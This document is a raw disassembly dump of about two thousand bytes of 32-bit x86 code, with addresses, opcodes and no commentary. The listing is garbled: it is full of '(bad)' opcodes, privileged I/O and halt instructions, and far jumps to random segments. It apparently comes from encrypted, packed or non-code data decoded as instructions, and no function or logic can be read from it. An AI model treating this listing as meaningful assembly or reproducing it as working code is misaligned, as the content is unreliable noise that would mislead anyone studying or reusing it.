  41980b:	adc    esi,DWORD PTR ds:0x1d3d3834
  419811:	scas   al,BYTE PTR es:[edi]
  419812:	enter  0xb6dd,0x1f
  419816:	popf   
  419817:	or     al,0xeb
  419819:	cld    
  41981a:	int3   
  41981b:	hlt    
  41981c:	(bad)  
  41981d:	mov    esi,0x836891a8
  419822:	shl    DWORD PTR [ecx+0x7d3f96bd],0xb1
  419829:	icebp  
  41982a:	jmp    0x419850
  41982c:	xor    eax,0x6fcd810c
  419831:	xor    DWORD PTR [ebx-0x5a],esi
  419834:	in     al,dx
  419835:	push   eax
  419836:	hlt    
  419837:	mov    ch,0xc7
  419839:	loope  0x4197ec
  41983b:	cs arpl cx,di
  41983e:	dec    esp
  41983f:	int    0x36
  419841:	cdq    
  419842:	repz ja 0x419852
  419845:	pcmpeqd mm1,mm0
  419848:	push   esi
  419849:	je     0x419816
  41984b:	(bad)  
  41984c:	sahf   
  41984d:	pop    edi
  41984e:	in     al,0x22
  419850:	push   cs
  419851:	or     BYTE PTR [ebp-0xe0ef7ad],bh
  419857:	test   DWORD PTR [eax],ebp
  419859:	jmp    0x20de:0xd2a0c852
  419860:	pop    ds
  419861:	iret   
  419862:	dec    ebx
  419863:	sbb    dl,dh
  419865:	mov    dl,0x22
  419867:	adc    edi,DWORD PTR [ebp+ebp*8-0x191b4080]
  41986e:	xor    eax,0x2d8515ef
  419873:	pop    ebx
  419874:	mov    edx,DWORD PTR [ebx+esi*8+0x7127b804]
  41987b:	ror    WORD PTR [esi+0x1b],0xdb
  419880:	sbb    ebx,edi
  419882:	xchg   cl,dh
  419884:	retf   0x996e
  419887:	and    bl,BYTE PTR [ebx+0x3e007b85]
  41988d:	loope  0x4198bd
  41988f:	std    
  419890:	leave  
  419891:	dec    edi
  419892:	xchg   ecx,eax
  419893:	pop    edi
  419894:	xor    DWORD PTR [edi],esi
  419896:	push   ebx
  419897:	out    0x83,al
  419899:	inc    esi
  41989a:	mov    edx,0x3194ea35
  41989f:	pop    ebx
  4198a0:	jmp    0x7061:0xf6aaf4d8
  4198a7:	xor    ebx,esi
  4198a9:	lahf   
  4198aa:	cmp    BYTE PTR [eax-0x7c5f0fae],bl
  4198b0:	mov    ah,0x6a
  4198b2:	add    al,0xb1
  4198b4:	sub    BYTE PTR [eax-0x2ffecb7b],0x3b
  4198bb:	ficom  DWORD PTR [ebx+0x55e9c4d2]
  4198c1:	imul   esi,ecx,0xffffffbc
  4198c4:	aam    0x4
  4198c6:	jno    0x419893
  4198c8:	std    
  4198c9:	test   BYTE PTR [edx],ah
  4198cb:	inc    edx
  4198cc:	popf   
  4198cd:	iret   
  4198ce:	inc    ecx
  4198cf:	(bad)
  4198d4:	sub    ah,dl
  4198d6:	mov    dh,0x12
  4198d8:	call   0x88706e20
  4198dd:	pop    esi
  4198de:	ins    WORD PTR es:[edi],dx
  4198e0:	xor    al,0x78
  4198e2:	aas    
  4198e3:	mov    edx,0xfa0241e0
  4198e8:	jns    0x41992e
  4198ea:	jle    0x4198ee
  4198ec:	adc    esp,edi
  4198ee:	and    DWORD PTR [edx],0xc417f16
  4198f4:	dec    ecx
  4198f5:	es push ds
  4198f7:	ret    
  4198f8:	retf   
  4198f9:	(bad)  
  4198fa:	fisttp DWORD PTR [eax]
  4198fc:	daa    
  4198fd:	add    edi,edx
  4198ff:	shl    BYTE PTR [eax+0x1e],0x93
  419903:	loop   0x419960
  419905:	sub    dl,BYTE PTR [ecx+0x9eb513b]
  41990b:	add    DWORD PTR [edx],eax
  41990d:	jecxz  0x41992f
  41990f:	push   ebx
  419910:	xor    DWORD PTR [ebx],eax
  419912:	test   al,0x7a
  419914:	fs (bad) 
  419916:	xchg   esi,eax
  419917:	dec    esp
  419918:	loop   0x4198e2
  41991a:	nop
  41991b:	push   esp
  41991c:	pop    esp
  41991d:	or     BYTE PTR [eax],0x87
  419920:	dec    ebp
  419921:	cmp    BYTE PTR [edx],al
  419923:	push   ss
  419924:	jge    0x419999
  419926:	scas   al,BYTE PTR es:[edi]
  419927:	mov    ecx,0x7f4f5d65
  41992c:	pop    edi
  41992d:	data16 sub BYTE PTR [ebx],dh
  419930:	neg    DWORD PTR [edi-0x47]
  419933:	jns    0x419966
  419935:	(bad)  
  419936:	fcmovu st,st(0)
  419938:	jbe    0x4199b6
  41993a:	and    eax,0x7598d2b7
  41993f:	push   edx
  419940:	mov    dl,0x42
  419942:	add    DWORD PTR [eax-0x10],0xd8b78af9
  419949:	dec    ebp
  41994a:	dec    ebx
  41994b:	nop
  41994c:	adc    esi,DWORD PTR [eax-0xe]
  41994f:	or     eax,0xc05229a4
  419954:	pop    ecx
  419955:	fwait
  419956:	xlat   BYTE PTR ds:[ebx]
  419957:	push   edi
  419958:	cmp    eax,0x384045d7
  41995d:	imul   edi,DWORD PTR [esi-0x25],0x5f
  419961:	call   0x22839a38
  419966:	retf   
  419967:	or     al,0xff
  419969:	xchg   DWORD PTR ds:0x24269d23,esp
  41996f:	and    eax,0x35d0f46
  419974:	es jg  0x4199a3
  419977:	lods   al,BYTE PTR ds:[esi]
  419978:	inc    esi
  419979:	jno    0x4198fd
  41997b:	std    
  41997c:	cwde   
  41997d:	or     DWORD PTR [eax+0x48],eax
  419980:	pop    ss
  419981:	rcr    DWORD PTR [ecx],cl
  419983:	stc    
  419984:	lods   al,BYTE PTR ds:[esi]
  419985:	pushf  
  419986:	stos   BYTE PTR es:[edi],al
  419987:	dec    ebx
  419988:	inc    eax
  419989:	out    0x23,al
  41998b:	rcl    DWORD PTR [edx],0x27
  41998e:	mov    WORD PTR [ebp+0x60b3b751],ds
  419994:	add    al,0x19
  419996:	add    al,0xaa
  419998:	dec    edi
  419999:	mov    BYTE PTR [eax],ch
  41999b:	faddp  st(5),st
  41999d:	sub    ah,BYTE PTR [edx+ebx*1-0x31]
  4199a1:	data16 jp 0x4199bf
  4199a4:	ins    BYTE PTR es:[edi],dx
  4199a5:	imul   BYTE PTR [esi]
  4199a7:	fwait
  4199a8:	test   dh,ch
  4199aa:	(bad)  
  4199ac:	add    dh,BYTE PTR [ecx-0xb]
  4199af:	arpl   sp,si
  4199b1:	ins    BYTE PTR es:[edi],dx
  4199b2:	loopne 0x4199a8
  4199b4:	xchg   ebx,eax
  4199b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199b6:	fild   QWORD PTR [esp]
  4199b9:	loopne 0x4199ae
  4199bb:	push   eax
  4199bc:	pop    ds
  4199bd:	scas   al,BYTE PTR es:[edi]
  4199be:	enter  0x11e5,0x19
  4199c2:	mov    edx,ecx
  4199c4:	pop    esp
  4199c5:	mov    ecx,0x85719a68
  4199ca:	mov    dh,0x73
  4199cc:	into   
  4199cd:	sub    eax,eax
  4199cf:	(bad)  
  4199d0:	mov    ds:0x4b7b516,eax
  4199d5:	adc    edi,esi
  4199d7:	mov    ds:0xc2da804e,al
  4199dc:	idiv   cl
  4199de:	jg     0x4199f0
  4199e0:	lods   eax,DWORD PTR ds:[esi]
  4199e1:	sbb    al,0x7f
  4199e3:	dec    edi
  4199e4:	call   0xf32b:0x69c4c9e2
  4199eb:	in     eax,0x7c
  4199ed:	addr16 std 
  4199ef:	(bad)  
  4199f1:	xor    eax,0xa0bde667
  4199f6:	imul   ebp,DWORD PTR ds:0xbb83ce05,0xcbcdf85e
  419a00:	jmp    0x419a39
  419a02:	fld    DWORD PTR [edi-0x18]
  419a05:	inc    esi
  419a06:	jne    0x4199b7
  419a08:	lock sub DWORD PTR [eax+0x1b],0x67
  419a0d:	mov    esp,0x20e9c70c
  419a12:	mov    WORD PTR [edx+0x4e47af23],ds
  419a18:	scas   eax,DWORD PTR es:[edi]
  419a19:	inc    esp
  419a1a:	pop    es
  419a1b:	data16 ja 0x419a44
  419a1e:	sbb    BYTE PTR [ebp+0x26],al
  419a21:	xchg   edi,eax
  419a22:	out    dx,al
  419a23:	xor    eax,0xa6b626fa
  419a28:	loopne 0x4199ae
  419a2a:	je     0x4199f3
  419a2c:	mov    bh,0x26
  419a2e:	xor    BYTE PTR [ebx-0x49],0x65
  419a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a33:	lods   al,BYTE PTR ds:[esi]
  419a34:	hlt    
  419a35:	pop    esi
  419a36:	mov    ecx,0x6d120ce6
  419a3b:	(bad)  
  419a3c:	sbb    DWORD PTR [edi+0x53be4ad],esi
  419a42:	mov    bl,0xbe
  419a44:	mov    fs,esp
  419a46:	mov    ds:0x67d08f2e,eax
  419a4b:	ret    
  419a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a4d:	daa    
  419a4e:	adc    edi,DWORD PTR [esi+edi*8]
  419a51:	dec    ecx
  419a52:	push   0x24de6932
  419a57:	jb     0x419a57
  419a59:	mov    ds:0xe8fdbe95,eax
  419a5e:	pop    ecx
  419a5f:	mov    eax,ebx
  419a61:	dec    sp
  419a63:	shl    BYTE PTR [eax*4-0x7bd070a8],1
  419a6a:	mov    bl,0x87
  419a6c:	fcom   DWORD PTR [ebp+0x3c]
  419a6f:	inc    edi
  419a70:	inc    esp
  419a71:	inc    esi
  419a72:	cmp    al,0xbe
  419a74:	sub    BYTE PTR [ebx+ecx*1-0x6c],al
  419a78:	fstp   QWORD PTR [edx]
  419a7a:	push   esp
  419a7b:	sub    al,cl
  419a7d:	ror    DWORD PTR [esi+0x4d],cl
  419a80:	pop    eax
  419a81:	(bad)  
  419a82:	dec    edi
  419a83:	stos   DWORD PTR es:[edi],eax
  419a84:	mov    BYTE PTR [ebx-0xc2eaa47],dh
  419a8a:	dec    esi
  419a8b:	mov    dh,cl
  419a8d:	aad    0x3d
  419a8f:	mov    eax,DWORD PTR [esi]
  419a91:	ins    DWORD PTR es:[edi],dx
  419a92:	test   al,0x6f
  419a94:	daa    
  419a95:	dec    esp
  419a96:	and    DWORD PTR [ecx+0x54],ecx
  419a99:	ins    DWORD PTR es:[edi],dx
  419a9a:	xchg   BYTE PTR [eax-0x80],dl
  419a9d:	(bad)  [edi-0x6f954463]
  419aa3:	jle    0x419b09
  419aa5:	jg     0x419aa8
  419aa7:	mov    ds:0x4473774a,al
  419aac:	push   ebx
  419aad:	aad    0x63
  419aaf:	mov    bl,0x93
  419ab1:	push   edx
  419ab2:	push   ebp
  419ab3:	cmp    esi,esi
  419ab5:	pop    eax
  419ab6:	dec    ebx
  419ab7:	dec    ebx
  419ab8:	inc    eax
  419ab9:	popa   
  419aba:	fistp  DWORD PTR [ecx-0x705d01f0]
  419ac0:	mov    ?,WORD PTR [esi+0x28]
  419ac3:	clc    
  419ac4:	push   ebp
  419ac5:	xchg   ebx,eax
  419ac6:	pop    edx
  419ac7:	popa   
  419ac8:	shl    BYTE PTR [esi+esi*4+0x23],1
  419acc:	and    DWORD PTR [ebx+ebp*4],esi
  419acf:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  419ad1:	sub    al,0xe2
  419ad3:	aas    
  419ad4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ad5:	lds    ebx,FWORD PTR [eax+0x63]
  419ad8:	std    
  419ad9:	in     eax,dx
  419ada:	xor    WORD PTR [ebx+0x925486f],dx
  419ae1:	out    0x63,al
  419ae3:	lds    esi,FWORD PTR [edx-0x79]
  419ae6:	push   ebx
  419ae7:	mov    al,ds:0x88d01cd5
  419aec:	pushf  
  419aed:	call   0x538b:0x4bb47a67
  419af4:	push   ds
  419af5:	sub    ah,ch
  419af7:	pop    esi
  419af8:	adc    DWORD PTR [ebx],eax
  419afa:	xor    eax,0x88d0d153
  419aff:	and    cl,ch
  419b01:	les    eax,FWORD PTR [ebx]
  419b03:	imul   ecx,DWORD PTR [ebp-0x56],0x4c
  419b07:	and    bh,BYTE PTR [ebp+edx*8+0x39b3e0bc]
  419b0e:	add    eax,DWORD PTR [ebx-0x51]
  419b11:	popf   
  419b12:	jmp    0x627b:0x73cfe494
  419b19:	adc    DWORD PTR [ebx-0x7c671d7f],esp
  419b1f:	sbb    al,0x49
  419b21:	clc    
  419b22:	scas   eax,DWORD PTR es:[edi]
  419b23:	push   ecx
  419b24:	fldenv [edx]
  419b26:	sar    DWORD PTR [esi+0x54],0xdc
  419b2a:	xchg   esi,eax
  419b2b:	in     eax,0x4
  419b2d:	jmp    0xb1bb3608
  419b32:	push   esi
  419b33:	jmp    0x23b3:0xa44b7d25
  419b3a:	cdq    
  419b3b:	adc    BYTE PTR [ebx],bl
  419b3d:	ins    BYTE PTR es:[edi],dx
  419b3e:	aas    
  419b3f:	inc    esp
  419b40:	or     cl,BYTE PTR [ebx+esi*2]
  419b43:	mov    ss:0x63cbe9f9,eax
  419b49:	clc    
  419b4a:	test   DWORD PTR [ebp+ebx*4-0x1d333ebd],edx
  419b51:	push   0x25
  419b53:	dec    ebp
  419b54:	push   ebx
  419b55:	push   ds
  419b56:	(bad)  
  419b57:	jg     0x419b39
  419b59:	fwait
  419b5a:	jg     0x419b36
  419b5c:	sub    eax,0x31b80b3b
  419b61:	pusha  
  419b62:	aad    0x51
  419b64:	cmp    al,0x24
  419b66:	int    0x9f
  419b68:	rol    edx,0xe7
  419b6b:	call   0x9280ef97
  419b70:	cmp    ch,BYTE PTR [edi-0x5]
  419b73:	pop    ds
  419b74:	xchg   edi,eax
  419b75:	je     0x419b8b
  419b77:	inc    esp
  419b78:	ror    DWORD PTR [ebp-0x40],1
  419b7b:	jae    0x419b4c
  419b7d:	in     al,0x34
  419b7f:	push   eax
  419b80:	push   esp
  419b81:	dec    ebx
  419b82:	xchg   esi,eax
  419b83:	retf   
  419b84:	sub    eax,0x2de02ed4
  419b89:	fsub   st,st(1)
  419b8b:	xor    DWORD PTR [ebx-0x5],edi
  419b8e:	push   es
  419b8f:	sbb    eax,0xd3914e7c
  419b94:	adc    bh,al
  419b96:	xchg   dl,cl
  419b98:	add    BYTE PTR [ebx+0x28d59559],dh
  419b9e:	addr16 push edx
  419ba0:	jno    0x419bbd
  419ba2:	mov    ah,0xeb
  419ba4:	or     esi,edi
  419ba6:	sub    edx,DWORD PTR cs:[ebp-0x37]
  419baa:	pop    ds
  419bab:	push   ebx
  419bac:	pop    ebx
  419bad:	(bad)  
  419bae:	push   edi
  419baf:	jne    0x419b62
  419bb1:	mov    dl,0x9b
  419bb3:	push   ebx
  419bb4:	sub    BYTE PTR ds:0x9e213fdd,al
  419bba:	icebp  
  419bbb:	push   edi
  419bbc:	xchg   edi,eax
  419bbd:	lods   al,BYTE PTR ds:[esi]
  419bbe:	jnp    0x419c2d
  419bc0:	mov    eax,0x5b6d99bf
  419bc5:	dec    edi
  419bc6:	fcmovne st,st(0)
  419bc8:	pop    edx
  419bc9:	dec    ebp
  419bca:	push   ebx
  419bcb:	(bad)  
  419bcc:	stos   BYTE PTR es:[edi],al
  419bcd:	pop    edi
  419bce:	rcr    bl,1
  419bd0:	(bad)  
  419bd1:	nop
  419bd2:	push   eax
  419bd3:	push   edx
  419bd4:	jl     0x419c49
  419bd6:	cs xchg esi,eax
  419bd8:	push   es
  419bd9:	test   DWORD PTR [edx],edx
  419bdb:	mov    ch,0xf8
  419bdd:	(bad)  
  419bde:	int3   
  419bdf:	stos   BYTE PTR es:[edi],al
  419be0:	ret    
  419be1:	xor    al,0xdf
  419be3:	adc    DWORD PTR [esp+eax*2+0x2d],ebp
  419be7:	sub    eax,0x8d3fed58
  419bec:	sub    DWORD PTR [ebp+ebx*1-0x78],0x1ec1c5ab
  419bf4:	adc    ebp,DWORD PTR [esi-0x9]
  419bf7:	not    BYTE PTR [ebx-0x6ab83510]
  419bfd:	mov    ah,0xd4
  419bff:	aad    0x92
  419c01:	scas   al,BYTE PTR es:[edi]
  419c02:	and    esi,DWORD PTR ds:0x2ae73257
  419c08:	xor    DWORD PTR [esi],eax
  419c0a:	ret    0xf31a
  419c0d:	iret   
  419c0e:	ret    0xb57f
  419c11:	pop    esi
  419c12:	sub    esp,ebp
  419c14:	loop   0x419c46
  419c16:	xor    ebp,DWORD PTR [esp+esi*8+0x2c]
  419c1a:	jmp    0x419c61
  419c1c:	int    0xc7
  419c1e:	xchg   ebp,eax
  419c1f:	pop    ebp
  419c20:	push   edi
  419c21:	out    0x19,eax
  419c23:	outs   dx,BYTE PTR ds:[esi]
  419c24:	idiv   DWORD PTR ds:[eax+edx*1-0x17]
  419c29:	dec    eax
  419c2a:	mov    al,0xa7
  419c2c:	js     0x419c6c
  419c2e:	mov    bh,0xad
  419c30:	adc    eax,DWORD PTR [edx-0x7e6eca7b]
  419c36:	imul   edx,DWORD PTR [ebp-0x2f8e67d1],0x12088bde
  419c40:	loop   0x419c83
  419c42:	mov    al,0x51
  419c44:	sbb    cl,0x88
  419c47:	in     al,0x3d
  419c49:	call   0xc4ce:0x24b911c8
  419c50:	or     DWORD PTR [ecx],esp
  419c52:	in     eax,dx
  419c53:	inc    ecx
  419c54:	or     BYTE PTR [eax+0x115e2267],al
  419c5a:	test   eax,0xe0f6e4db
  419c5f:	mov    edx,0x3c47acd3
  419c64:	mov    al,ds:0x45ea5983
  419c69:	mov    bl,0x5d
  419c6b:	outs   dx,DWORD PTR ds:[esi]
  419c6c:	or     eax,0xf05e5211
  419c71:	lock add ebp,esp
  419c74:	sbb    al,0xab
  419c76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c78:	xor    eax,0x60a1d683
  419c7d:	or     ah,BYTE PTR [ebx-0x65]
  419c80:	ins    DWORD PTR es:[edi],dx
  419c81:	scas   eax,DWORD PTR es:[edi]
  419c82:	clc    
  419c83:	inc    eax
  419c84:	retf   
  419c85:	or     esp,edi
  419c87:	xlat   BYTE PTR ds:[ebx]
  419c88:	cmp    al,0x93
  419c8a:	jno    0x419c0d
  419c8c:	and    al,0x9a
  419c8e:	jle    0x419cc3
  419c90:	int3   
  419c91:	rep ins DWORD PTR es:[edi],dx
  419c93:	mov    bh,BYTE PTR [esi]
  419c95:	xchg   DWORD PTR [esi+edi*8-0x6b9c26f0],esi
  419c9c:	xchg   edi,eax
  419c9d:	stos   BYTE PTR es:[edi],al
  419c9e:	not    DWORD PTR [ebx-0x6109deb6]
  419ca4:	dec    esi
  419ca5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ca6:	sbb    eax,DWORD PTR [edx]
  419ca8:	xchg   ebx,eax
  419ca9:	sbb    eax,0xcdd61a4b
  419cae:	cmp    BYTE PTR [esi+ebx*8-0x1972be95],dl
  419cb5:	repz sar edi,1
  419cb8:	mov    edx,0xa1c31351
  419cbd:	mov    dl,0x7
  419cbf:	xor    DWORD PTR [eax],0xba2288ca
  419cc5:	mov    esi,esp
  419cc7:	jg     0x419d37
  419cc9:	inc    ebp
  419cca:	fnstsw WORD PTR [edi]
  419ccc:	cmp    al,0x64
  419cce:	loopne 0x419cb9
  419cd0:	sub    DWORD PTR [ebp-0x119e97e2],0x68
  419cd7:	sub    al,0xa3
  419cd9:	jae    0x419cee
  419cdb:	inc    ebp
  419cdc:	mov    DWORD PTR [edi-0x76cddcf0],0x7e062ab4
  419ce6:	inc    eax
  419ce7:	xchg   edi,eax
  419ce8:	mov    bl,BYTE PTR [edx-0x43eb00a]
  419cee:	adc    eax,0xc1947df3
  419cf3:	inc    esi
  419cf4:	add    al,0xfe
  419cf6:	(bad)  
  419cf7:	packssdw mm1,QWORD PTR [esi+0x32]
  419cfb:	pop    esp
  419cfc:	push   0x3a
  419cfe:	stos   BYTE PTR es:[edi],al
  419cff:	not    DWORD PTR [eax+0x17b64ada]
  419d05:	imul   ebx,DWORD PTR [ecx],0xfb5db2e5
  419d0b:	pusha  
  419d0c:	add    eax,0x26acf97d
  419d11:	sbb    dl,BYTE PTR [eax+0x4f]
  419d14:	inc    ebx
  419d15:	out    dx,eax
  419d16:	jle    0x419d46
  419d18:	out    dx,al
  419d19:	repz aam 0x65
  419d1c:	stc    
  419d1d:	popf   
  419d1e:	and    al,0xca
  419d20:	xor    bl,BYTE PTR [edi]
  419d22:	mov    bh,0xfb
  419d24:	ss dec ebx
  419d26:	rol    al,cl
  419d28:	popa   
  419d29:	jp     0x419d21
  419d2b:	add    DWORD PTR [ebx+0x3d],eax
  419d2e:	dec    ebx
  419d2f:	mov    eax,0xae0e85d6
  419d34:	(bad)  
  419d35:	cwde   
  419d36:	jne    0x419db7
  419d38:	add    bh,BYTE PTR [ebx]
  419d3a:	iret   
  419d3b:	xor    BYTE PTR [ecx+eax*2-0x25],bh
  419d3f:	adc    DWORD PTR [ebp-0x52],ebx
  419d42:	ret    0xa59d
  419d45:	xor    esp,ebp
  419d47:	pop    eax
  419d48:	pop    eax
  419d49:	test   ah,0xb4
  419d4c:	or     BYTE PTR [esi+0x5fa0b406],ch
  419d52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d53:	jecxz  0x419daa
  419d55:	stc    
  419d56:	int3   
  419d57:	push   ecx
  419d58:	mov    bl,0x5d
  419d5a:	inc    esp
  419d5b:	test   al,0xb1
  419d5d:	(bad)  
  419d5e:	out    dx,al
  419d5f:	mov    dh,0xd8
  419d61:	(bad)  
  419d62:	pop    ecx
  419d63:	mov    al,0x95
  419d65:	xchg   edx,eax
  419d66:	aas    
  419d67:	mov    dh,0x2f
  419d69:	pop    esi
  419d6a:	adc    ebp,DWORD PTR [esi+ecx*2-0x2864e590]
  419d71:	push   esi
  419d72:	test   DWORD PTR [ebx+ebp*1-0x78],edi
  419d76:	push   0x2e5d4468
  419d7b:	push   0xffffffa1
  419d7d:	xor    al,0x8a
  419d7f:	mov    ah,0x59
  419d81:	out    dx,al
  419d82:	xchg   edi,eax
  419d83:	ss scas eax,DWORD PTR es:[edi]
  419d85:	call   0xbd1d84c4
  419d8a:	out    0xc2,eax
  419d8c:	int3   
  419d8d:	inc    ebx
  419d8e:	xor    dl,al
  419d90:	cli    
  419d91:	mov    cs,WORD PTR [ecx+0xd]
  419d94:	lahf   
  419d95:	pop    ds
  419d96:	lahf   
  419d97:	jp     0x419d45
  419d99:	jmp    0xfd8:0x25100d78
  419da0:	test   eax,0xed997189
  419da5:	sbb    ebx,ebx
  419da7:	scas   al,BYTE PTR es:[edi]
  419da8:	xlat   BYTE PTR ds:[ebx]
  419da9:	adc    BYTE PTR [ecx-0x24d54bb2],dh
  419daf:	call   0x25791059
  419db4:	dec    esi
  419db5:	pop    ebp
  419db6:	sub    DWORD PTR [edx+0x5bd25f81],ebx
  419dbc:	mov    BYTE PTR [ecx],bh
  419dbe:	inc    ecx
  419dbf:	daa    
  419dc0:	in     eax,dx
  419dc1:	push   ss
  419dc2:	mov    eax,0x29968a99
  419dc7:	into   
  419dc8:	pop    es
  419dc9:	dec    ebx
  419dca:	pop    eax
  419dcb:	jo     0x419dc6
  419dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dce:	sub    al,0x53
  419dd0:	mov    ah,0x19
  419dd2:	mov    DWORD PTR [ebp-0x5027235d],esp
  419dd8:	xor    eax,0x24faeacb
  419ddd:	sti    
  419dde:	sbb    DWORD PTR [ebp-0x62],ebp
  419de1:	mov    ch,BYTE PTR [edx]
  419de3:	xchg   esi,eax
  419de4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419de5:	dec    edi
  419de6:	or     eax,0xda484d2
  419deb:	fisubr WORD PTR [ebx-0x6c]
  419dee:	fs stos BYTE PTR es:[edi],al
  419df0:	pop    ds
  419df1:	fimul  WORD PTR [ebp-0x6fade23d]
  419df7:	mov    cl,0x8d
  419df9:	jo     0x419e5a
  419dfb:	dec    edi
  419dfc:	test   eax,0x7d55b1ff
  419e01:	pop    ecx
  419e02:	cmp    al,0xad
  419e04:	xchg   edx,eax
  419e05:	and    al,0x9c
  419e07:	mov    dl,0x82
  419e09:	inc    ebp
  419e0a:	mov    eax,ds:0x8aa1ff26
  419e0f:	stos   DWORD PTR es:[edi],eax
  419e10:	jno    0x419ded
  419e12:	ins    DWORD PTR es:[edi],dx
  419e13:	dec    ecx
  419e14:	lods   eax,DWORD PTR ds:[esi]
  419e15:	xor    eax,0xbb02b7bd
  419e1a:	scas   al,BYTE PTR es:[edi]
  419e1b:	dec    DWORD PTR [esi]
  419e1d:	setne  BYTE PTR [esi]
  419e20:	push   esi
  419e21:	fnsave [edx+0x1]
  419e24:	lds    edx,FWORD PTR [ecx-0x31]
  419e27:	jg     0x419ea2
  419e29:	push   esi
  419e2a:	add    eax,0x81cfb2bf
  419e2f:	lock xchg edi,eax
  419e31:	xchg   ecx,eax
  419e32:	inc    ebp
  419e33:	jae    0x419e5b
  419e35:	dec    ebp
  419e36:	sbb    BYTE PTR [ebp+0x1c7b8080],ah
  419e3c:	aas    
  419e3d:	fisub  DWORD PTR [eax+0x4f4aa148]
  419e43:	adc    DWORD PTR [eax+0x52],0xaeb4c00c
  419e4a:	mov    edx,0xc6e21a89
  419e4f:	jge    0x419de4
  419e51:	scas   eax,DWORD PTR es:[edi]
  419e52:	xor    DWORD PTR [ebx+0x3ea3f31f],ebp
  419e58:	dec    ebp
  419e59:	mov    al,ds:0xa8cadfb
  419e5e:	js     0x419e48
  419e60:	pop    es
  419e61:	test   al,0x6
  419e63:	popf   
  419e64:	sbb    cl,BYTE PTR [ebp+0x27e962c2]
  419e6a:	sub    eax,0x97adfa83
  419e6f:	cmp    ebx,DWORD PTR [edx-0x4e1c0fdf]
  419e75:	push   edx
  419e76:	enter  0xcf0c,0x96
  419e7a:	popa   
  419e7b:	call   0xc9ee1574
  419e80:	cmp    BYTE PTR [edx+0x37],bh
  419e83:	into   
  419e84:	or     ebp,DWORD PTR [eax+0xc713bb7]
  419e8a:	mov    edx,0xeb5535ed
  419e8f:	xor    eax,0xa9a8735a
  419e94:	xor    eax,0x744decf8
  419e99:	leave  
  419e9a:	popa   
  419e9b:	push   ds
  419e9c:	in     eax,dx
  419e9d:	add    BYTE PTR [edx],0x8
  419ea0:	int3   
  419ea1:	fstp   QWORD PTR [ebp-0x310125f]
  419ea7:	jne    0x419ee9
  419ea9:	outs   dx,DWORD PTR ds:[esi]
  419eaa:	cld    
  419eab:	lahf   
  419eac:	icebp  
  419ead:	pop    ebx
  419eae:	jmp    0x419ed6
  419eb0:	xlat   BYTE PTR ds:[ebx]
  419eb1:	(bad)  
  419eb2:	mov    dh,0xa3
  419eb4:	rcl    DWORD PTR [ecx+ecx*2],cl
  419eb7:	out    0x9b,al
  419eb9:	leave  
  419eba:	cmp    esi,DWORD PTR [ebp-0x60c5e66]
  419ec0:	cmp    DWORD PTR [edx],edx
  419ec2:	fistp  WORD PTR [ebx+0x5a562d8c]
  419ec8:	stc    
  419ec9:	das    
  419eca:	pop    ds
  419ecb:	mov    edi,0x744acbee
  419ed0:	push   edx
  419ed1:	outs   dx,BYTE PTR ds:[esi]
  419ed2:	test   al,0xad
  419ed4:	push   esi
  419ed5:	pop    ecx
  419ed6:	xchg   ecx,eax
  419ed7:	aaa    
  419ed8:	or     esi,DWORD PTR [eax]
  419eda:	and    eax,0x8e66df7b
  419edf:	push   cs
  419ee0:	pushf  
  419ee1:	(bad)  ds:0xfb872edc
  419ee7:	xor    eax,0x7bb738d6
  419eec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419eee:	mov    esi,0xb55b52a1
  419ef3:	lods   al,BYTE PTR ds:[esi]
  419ef4:	jnp    0x419ea4
  419ef6:	pop    ss
  419ef7:	pop    edx
  419ef8:	jbe    0x419f4c
  419efa:	pop    ds
  419efb:	shr    BYTE PTR [ecx-0x9],0x88
  419eff:	add    ebp,DWORD PTR [ebp+0x5115db21]
  419f05:	jnp    0x419f04
  419f07:	scas   eax,DWORD PTR es:[edi]
  419f08:	retf   
  419f09:	inc    ebp
  419f0a:	sbb    eax,0x5a1ae0a
  419f0f:	sahf   
  419f10:	jle    0x419f4f
  419f12:	xlat   BYTE PTR ds:[ebx]
  419f13:	icebp  
  419f14:	pop    ecx
  419f15:	cmp    BYTE PTR [edx+ebx*2-0x4d550f04],dh
  419f1c:	aas    
  419f1d:	xor    DWORD PTR [ebx-0x5fec43b3],ecx
  419f23:	and    esp,DWORD PTR [ebx-0x60]
  419f26:	nop
  419f27:	push   ecx
  419f28:	xchg   esp,eax
  419f29:	out    dx,eax
  419f2a:	pop    eax
  419f2b:	in     eax,0xd9
  419f2d:	bound  ebx,QWORD PTR [esi]
  419f2f:	or     eax,0xc56cd2a2
  419f34:	sbb    dh,bl
  419f36:	test   eax,0x2453a9f
  419f3b:	jmp    0x419eec
  419f3d:	jno    0x419f3a
  419f3f:	mov    ebx,0x198e0bc1
  419f44:	lds    ecx,FWORD PTR [ecx-0x6f7531e6]
  419f4a:	inc    ecx
  419f4b:	xchg   ebp,eax
  419f4c:	test   al,0x88
  419f4e:	mov    BYTE PTR [ebp-0x39f7acc7],0x33
  419f55:	push   eax
  419f56:	add    cl,cl
  419f58:	call   0x573b:0xdf06c189
  419f5f:	call   0xcef9:0x31355d2f
  419f66:	add    eax,0xb48f2362
  419f6b:	test   al,0xb6
  419f6d:	cli    
  419f6e:	or     esi,DWORD PTR ds:0x62814ce5
  419f74:	pop    eax
  419f75:	mov    ecx,0x69cf1859
  419f7a:	and    ch,0x38
  419f7d:	nop
  419f7e:	ins    BYTE PTR es:[edi],dx
  419f7f:	gs fs jl 0x419f91
  419f83:	les    esi,FWORD PTR [ebx+0xa33be57]
  419f89:	out    0xbe,eax
  419f8b:	or     DWORD PTR [edi-0x3ae1b54e],ebp
  419f91:	lahf   
  419f92:	mov    ecx,0xd50ae47
  419f97:	push   cs
  419f98:	inc    edx
  419f99:	or     eax,0x31fdd12c
  419f9e:	pushf  
